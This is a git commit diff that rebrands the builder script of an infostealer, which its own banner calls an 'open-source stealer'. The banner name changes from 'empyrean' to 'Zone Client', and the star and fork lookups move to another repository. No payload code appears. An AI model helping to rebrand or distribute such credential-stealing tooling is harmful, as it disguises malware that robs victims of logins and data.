3133d3321f719ec41e5e36a29f62a1f7eebe2e1a
ronaldsbroker <151461245+ronaldsbroker@users.noreply.github.com>
2023-11-19 14:12:15 -0600

    Update main.py

--- builder/main.py
+++ builder/main.py
@@ -15,9 +15,9 @@ from util.writeconfig import WriteConfig
 
 def main():
     stars = requests.get(
-        f"https://api.github.com/repos/addi00000/empyrean").json()["stargazers_count"]
+        f"https://api.github.com/repos/ronaldsbroker/demo").json()["stargazers_count"]
     forks = requests.get(
-        f"https://api.github.com/repos/addi00000/empyrean").json()["forks_count"]
+        f"https://api.github.com/repos/ronaldsbroker/demo").json()["forks_count"]
 
     logging.basicConfig(
         level="NOTSET",
@@ -30,7 +30,7 @@ def main():
     logging.getLogger("rich")
     console = Console()
 
-    console.print(pyfiglet.figlet_format("empyrean", font="graffiti"),
+    console.print(pyfiglet.figlet_format("Zone Client", font="graffiti"),
                   justify="center", highlight=False, style="magenta", overflow="ignore")
     console.print(f"Easy to use and open-source stealer.\nStars: {stars} | Forks: {forks}",
                   justify="center", highlight=False, style="bold magenta", overflow="ignore")
